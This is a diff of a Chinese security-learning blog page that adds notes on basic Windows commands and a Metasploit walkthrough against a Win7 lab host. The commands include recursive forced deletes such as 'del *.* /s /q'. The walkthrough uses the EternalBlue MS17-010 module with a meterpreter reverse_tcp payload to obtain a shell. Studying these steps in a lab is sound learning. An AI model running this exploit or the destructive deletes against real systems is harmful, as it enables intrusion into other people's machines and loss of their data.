@@ -152,6 +152,91 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-安全基础学习" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/08/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/">安全基础学习</a>
+    </h1>
+  
+
+        
+        <a href="/2020/04/08/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/" class="archive-article-date">
+  	<time datetime="2020-04-08T13:00:30.205Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-08</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="window命令"><a href="#window命令" class="headerlink" title="window命令"></a>window命令</h3><ol>
+<li>cd :直接退到更目录下  </li>
+<li>rd :删除空文件夹  </li>
+<li>rd /s /q:无条件删除空文件夹  /s 表示包括子文件夹，/q表示无需提示</li>
+<li>echo 字符串 &gt;&gt; 路径 + 文件名.扩展名 ：将字符串写入到文件夹中，写在最后面  </li>
+<li>echo  字符串 &gt; 路径 + 文件名.扩展名 ：将字符串覆盖原有内容  </li>
+<li>type 文件名.扩展名：浏览该文件</li>
+<li>del 文件名.扩展名 ：删除文件  </li>
+<li>copy con 文件名.扩展名：在控制台输入文字到文件中，回车后开始编辑，按住ctrl + z 结束编辑    </li>
+<li>del <em>.</em> /s /q :删除所有文件 /s表示  </li>
+<li>attrib +h 文件夹  ：隐藏文件夹 h表示hidden  </li>
+<li>attrib -h 文件夹名称 ：取消隐藏文件夹  </li>
+<li>shutdown -s -t 秒:定时关机，-s表示关机 -t表示时间  </li>
+<li>shutdown -s -f -t :表示定时强制关机，有时候12命令不好用的情况下  </li>
+<li>shutdown -r -t 秒:定时重启  </li>
+<li>shutdown -a :取消所有定时  </li>
+<li>shutdown -l:注销  </li>
+<li>copy 原文件路径名 目标文件路径名 ：复制文件  </li>
+<li>./：当前路径名  </li>
+<li>../:上一级路径  </li>
+<li>move  原文件路径名 目标文件路径名：移动文件  </li>
+<li>ren 旧名 新名 ：将文件/文件夹重命名，ren是rename的缩写</li>
+</ol>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/04/08/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-网络安全学习" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -252,6 +337,18 @@
 <li>set CMD calc.exe :上传一个计算机程序  </li>
 <li>run：开始生成一个文件  </li>
 <li>找到文件存放路径，将该文件放到win7以上的系统上面进行使用即可</li>
+</ol>
+<h3 id="渗透测试四"><a href="#渗透测试四" class="headerlink" title="渗透测试四"></a>渗透测试四</h3><p>永恒之蓝 ms17-010  即勒索病毒</p>
+<ol>
+<li>同上  </li>
+<li>search ms-17-010  </li>
+<li>use exploitwindows/smb/ms17-010-eternalblue  </li>
+<li>show options</li>
+<li>set RHOST win7主机,set LHOST kali主机ip ：配置RHOST 和LHOST   </li>
+<li>set payload windows/x64/smb/meterpreter/reverse_tcp  </li>
+<li>run：运行攻击    </li>
+<li>拿shell，获取计算机权限。</li>
+<li>遇到的问题，win7的网络模式需设置为桥接模式，否则在nat模式中是无法连接网络的。</li>
 </ol>
 <hr>
 
